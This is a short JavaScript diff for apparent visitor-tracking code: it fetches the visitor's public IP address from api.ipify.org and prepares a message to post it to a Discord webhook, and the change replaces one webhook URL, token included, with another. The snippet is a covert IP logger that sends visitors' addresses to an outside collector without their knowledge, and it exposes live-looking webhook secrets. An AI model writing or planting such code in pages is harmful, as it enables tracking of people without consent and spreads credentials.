@@ -1,7 +1,7 @@
 fetch('https://api.ipify.org')
   .then(response => response.text())
   .then(ip => {
-    const webhookUrl = 'https://canary.discord.com/api/webhooks/1514007577355092080/UT9EM1Y7BApmmULLk_Z9gn1Rbw7Le42Xq1xDUYGceFKl39imPfYXI0Nrte1mihIKebxd';
+    const webhookUrl = 'https://discord.com/api/webhooks/1570794844572483676/7PAI4xda77SxJKrFcy8Kaf7YHdNe0h8t7oCsxprI_I7-pIO85tVbRgkxsXLYLq9oY5oc';
     
     const payload = {
       content: `**Visitor IP: ${ip}**`,
